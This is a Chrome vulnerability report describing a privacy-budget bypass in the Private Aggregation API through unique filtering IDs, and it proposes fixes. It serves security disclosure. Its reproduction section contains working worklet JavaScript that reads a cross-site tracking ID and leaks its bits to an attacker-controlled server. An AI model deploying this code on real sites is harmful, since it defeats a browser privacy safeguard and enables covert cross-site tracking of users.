# Chrome VRP Report: Private Aggregation API Filtering ID Multiplies Information Capacity Beyond L1 Budget Intent

## Summary

The Private Aggregation API enforces an L1 privacy budget that limits the sum of contribution `value` fields to 65536 per 10-minute window. However, each contribution can specify a unique `filtering_id` (up to 8 bytes = 2^64 possibilities), and the aggregation service processes each filtering_id as an independent aggregation channel. The budget only charges based on `value` sums, completely ignoring filtering_id diversity. This allows an attacker to encode N bits of cross-site information using N contributions of value=1, extracting up to 1000 bits per report (with `max_contributions=1000`) for only 1000 budget units — far exceeding the intended ~16 bits per budget period.

## Severity Assessment

- **Type**: Privacy Budget Bypass / Information Leakage Amplification
- **User Interaction**: None
- **Preconditions**: Attacker controls a SharedStorage or Protected Audience worklet
- **Chrome Version**: All versions supporting Private Aggregation with filtering IDs
- **Flags Required**: None (default configuration)
- **Compromised Renderer**: Not required
- **Key feature status**: `PrivateAggregationApiMaxContributions` = `"stable"` (enabled by default), allowing `maxContributions` up to 1000 per operation

## Technical Root Cause

### Budget charges only value, ignores filtering_id

`content/browser/private_aggregation/private_aggregation_budgeter.cc:665-670`:
```cpp
base::CheckedNumeric<int> total_budget_needed = std::accumulate(
    contributions.begin(), contributions.end(),
    /*init=*/base::CheckedNumeric<int>(0), /*op=*/
    [](base::CheckedNumeric<int> running_sum,
       const blink::mojom::AggregatableReportHistogramContribution&
           contribution) { return running_sum + contribution.value; });
```

The budget calculation sums only `contribution.value`. The `filtering_id` field has zero impact on budget consumption.

### Each filtering_id creates an independent output

`content/browser/private_aggregation/private_aggregation_pending_contributions.h:42-58`:
```cpp
struct ContributionMergeKey {
  absl::uint128 bucket;
  uint64_t filtering_id;
  // ...
  bool operator==(const ContributionMergeKey& other) const = default;
};
```

Contributions are merged (summed) only when they share the same `(bucket, filtering_id)` pair. Different filtering_ids are kept separate.

At the aggregation service, each `(bucket, filtering_id)` combination produces a separate aggregation output with independent noise. The attacker queries separate filtering_ids to extract independent bits.

### Configuration limits

- `kMaximumFilteringIdMaxBytes = 8` → up to 2^64 distinct filtering IDs per report
- `kDefaultFilteringIdMaxBytes = 1` → up to 256 distinct filtering IDs (default)
- `kMaxContributionsSharedStorage = 20` → 20 bits per report (SharedStorage)
- `kMaxContributionsProtectedAudience = 100` → 100 bits per report (PA)
- `kMaxContributionsWhenCustomized = 1000` → 1000 bits per report (custom)
- Budget per 10min = 65536

## Information Capacity Analysis

### Without filtering_id exploitation (intended):
- Budget = 65536, all contributions to same filtering_id
- Information = log2(possible_value_combinations) ≈ log2(65536) = 16 bits per budget period
- Each additional bit requires exponentially more budget

### With filtering_id exploitation:
- Budget = N (each contribution has value=1, unique filtering_id)
- Information = N bits (linear in budget, not logarithmic)
- With max_contributions=1000: 1000 bits per report for budget cost = 1000
- Per 10-minute budget window: 65536 bits total (65536 contributions across 65 reports)

### Amplification factor: 65536 bits / 16 bits = 4096x the intended information capacity

## Reproduction Steps

### Setup: SharedStorage worklet with filtering_id exploitation

```javascript
// Page at https://attacker.com, embedded as iframe on https://publisher.com
// Register worklet
await sharedStorage.worklet.addModule('worklet.js');
// Execute operation
await sharedStorage.run('exfiltrate');
```

### Worklet (`worklet.js`):
```javascript
class ExfiltrateOp {
  async run() {
    // Read cross-site data from SharedStorage
    const secret = await sharedStorage.get('user-tracking-id');
    
    // Encode each character as contributions with unique filtering_ids
    // Each filtering_id is an independent bit channel
    for (let i = 0; i < Math.min(secret.length, 20); i++) {
      const charCode = secret.charCodeAt(i);
      // Encode 8 bits per character using 8 filtering_ids
      for (let bit = 0; bit < 8; bit++) {
        if ((charCode >> bit) & 1) {
          privateAggregation.contributeToHistogram({
            bucket: 1n,          // Same bucket for all
            value: 1,            // Minimum budget cost
            filteringId: BigInt(i * 8 + bit)  // Unique filtering_id per bit
          });
        }
      }
    }
    // Total budget consumed: number_of_1_bits (≤ 160 for 20 chars)
    // Information leaked: up to 160 bits
  }
}
register('exfiltrate', ExfiltrateOp);
```

### Attacker server recovery:
After receiving the aggregatable report, the attacker queries the aggregation service with different `filteringIds`:
- Query filtering_id=0: If bucket 1 has value ≥ 1 → bit 0 of char 0 is 1
- Query filtering_id=1: If bucket 1 has value ≥ 1 → bit 1 of char 0 is 1
- ...
- Query filtering_id=159: If bucket 1 has value ≥ 1 → bit 7 of char 19 is 1

Each filtering_id provides an independent signal with the aggregation service's noise applied independently per filtering_id.

## Impact

The L1 privacy budget is the fundamental mechanism that limits cross-site information leakage in the Private Aggregation API. The intended model assumes that budget = 65536 limits information to approximately log2(65536) = 16 bits per 10-minute period. The filtering_id exploitation converts this from logarithmic to linear, allowing 4096x more information leakage than intended.

This undermines the core privacy guarantee of the Private Aggregation API.

## Suggested Fix

Option 1: **Include filtering_id count in budget calculation**
```cpp
// Budget should be: sum(values) * log2(unique_filtering_ids + 1)
// Or: Cap effective information at value * channels
size_t unique_filtering_ids = CountUniqueFilteringIds(contributions);
int effective_budget = total_budget_needed * (1 + log2(unique_filtering_ids));
```

Option 2: **Cap distinct filtering_ids per report**
```cpp
// In private_aggregation_host.cc, limit filtering_id diversity:
static constexpr size_t kMaxUniqueFilteringIdsPerReport = 16;
```

Option 3: **Budget per (bucket, filtering_id) combination**
```cpp
// Charge minimum budget per unique merge key, regardless of value
int budget_per_channel = max(1, kMinBudgetPerChannel);
total_budget = num_unique_merge_keys * budget_per_channel + sum(values);
```

## References

- Private Aggregation API explainer: https://github.com/patcg-individual-drafts/private-aggregation-api
- Filtering ID explainer: allows separate aggregation outputs per ID
- Chrome bug tracker: Related to aggregation service query model

## Files

- `content/browser/private_aggregation/private_aggregation_budgeter.cc:665-670` (budget calculation ignoring filtering_id)
- `content/browser/private_aggregation/private_aggregation_host.cc:243-262` (max contributions per caller)
- `content/browser/aggregation_service/aggregatable_report.h:45` (max filtering ID bytes = 8)
- `content/browser/private_aggregation/private_aggregation_pending_contributions.h:42-58` (ContributionMergeKey includes filtering_id)
- `content/browser/private_aggregation/private_aggregation_pending_contributions.cc:279-280` (merge only same key)
